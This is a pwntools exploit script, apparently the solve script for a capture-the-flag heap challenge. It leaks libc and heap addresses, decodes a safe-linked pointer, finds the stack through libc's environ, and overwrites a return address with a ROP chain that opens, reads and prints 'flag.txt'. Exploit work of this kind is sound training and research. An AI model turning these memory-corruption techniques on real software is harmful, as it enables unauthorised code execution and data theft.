from pwn import *

context.log_level = 'debug'
p = remote('mc.ax', 31245)

def create(idx, length, content):
    p.sendlineafter(':', 'C')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', content)

def free(idx):
    p.sendlineafter(':', 'F')
    p.sendlineafter(':', str(idx))

def write(idx, content):
    p.sendlineafter(':', 'W')
    p.sendlineafter(':', str(idx))
    p.sendafter(':', content)

def read(idx):
    p.sendlineafter(':', 'R')
    p.sendlineafter(':', str(idx))

def solve(val):
    key = 0
    plain = 0
    for i in range(1, 7):
        bits = 64-12*i
        if(bits < 0):
            bits = 0
        plain = ((val ^ key) >> bits) << bits
        key = plain >> 12

    return plain

def illegal_write_nop64(val1, val2):
    write(0, val1)
    write(4, val2)

for i in range(0, 7):
    create(i, 16, chr(0x41+i))
for i in range(0, 7):
    free(i)

create(0, 0x420, b'ABCD')
create(9, 24, b'A'*24)

free(9)

##### leak #####
read(0)
p.recvline()
p.recv(25)

leak_arr = p.recv(18)
leak_arr2 = []

for i in range(0, 18, 3):
    leak_arr2.append(leak_arr[i:i+2])

leak = int(b'0x'+b''.join(leak_arr2[::-1]), 16)
base = leak - 0x60 - 0x1f4c60
environ = base + 0x1fcec0
pop_rdi = base + 0x2d7dd
pop_rsi = base + 0x2eef9
pop_rdx = base + 0xd9c2d
popen = base + 0xfd990
pwrite = base + 0xfdd20
pread = base + 0xfdc80

p.recv(54)
heap_arr = p.recv(12)
heap_arr2 = []

for i in range(0, 12, 3):
    heap_arr2.append(heap_arr[i:i+2])
heap = int(b'0x'+b''.join(heap_arr2[::-1]), 16)

log.failure(hex(heap))
first_heap = solve(heap)

log.failure(hex(first_heap))
log.failure(hex(base))

#####stack leak#####
write(0, p64(0x100) + p64(environ))
read(4)
p.recvline()
p.recv(1)
environ_arr = p.recv(18)
environ_arr2 = []
for i in range(0, 18, 3):
    environ_arr2.append(environ_arr[i:i+2])
environ_leak = int(b'0x'+b''.join(environ_arr2[::-1]), 16)
ret = environ_leak - 0x140

log.success('ret => ' + hex(ret))

#####ROP CHAIN#####
payload = p64(0x401020)
payload += p64(pop_rdi) + p64(0x404100) + p64(pop_rsi) + p64(0) + p64(popen)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x404200) + p64(pop_rdx) + p64(0x300) + p64(pread)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404200) + p64(pop_rdx) + p64(0x300) + p64(pwrite)

illegal_write_nop64(p64(0xff) + p64(0x404100), p64(0x7478742e67616c66))
illegal_write_nop64(p64(0x200) + p64(ret), payload)

p.sendlineafter(':', 'E')
p.sendlineafter(':', '0')

p.interactive()
